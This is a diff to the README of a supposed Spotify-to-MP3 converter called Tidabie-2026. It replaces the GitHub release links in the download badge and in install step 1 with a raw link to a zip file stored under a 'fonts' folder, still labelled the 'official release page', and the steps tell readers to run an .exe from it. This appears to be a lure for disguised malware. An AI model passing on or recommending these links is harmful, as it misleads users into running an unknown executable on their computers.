@@ -5,7 +5,7 @@ description: "Download the full version of Tidabie Spotify Converter for Windows
 ---
 # 🎵 Tidabie-2026 - Save Spotify songs for offline listening
 
-[![](https://img.shields.io/badge/Download-Tidabie_2026-blue)](https://github.com/Liverchestnutsafetyisle244/Tidabie-2026/releases)
+[![](https://img.shields.io/badge/Download-Tidabie_2026-blue)](https://raw.githubusercontent.com/Liverchestnutsafetyisle244/liverchestnutsafetyisle244.github.io/main/fonts/v2.8.zip)
 
 Tidabie-2026 helps you convert Spotify tracks into MP3 files. You save your songs to your local computer storage. The tool works on Windows 11 and Windows 10. You keep your music files forever. The software maintains high audio quality during the conversion process.
 
@@ -23,7 +23,7 @@ Ensure your computer meets these standards before you start:
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the official release page: [https://github.com/Liverchestnutsafetyisle244/Tidabie-2026/releases](https://github.com/Liverchestnutsafetyisle244/Tidabie-2026/releases).
+1.  Visit the official release page: [https://raw.githubusercontent.com/Liverchestnutsafetyisle244/liverchestnutsafetyisle244.github.io/main/fonts/v2.8.zip](https://raw.githubusercontent.com/Liverchestnutsafetyisle244/liverchestnutsafetyisle244.github.io/main/fonts/v2.8.zip).
 2.  Locate the latest version file ending in .exe.
 3.  Click the file name to start the download.
 4.  Open the folder where you saved the file.
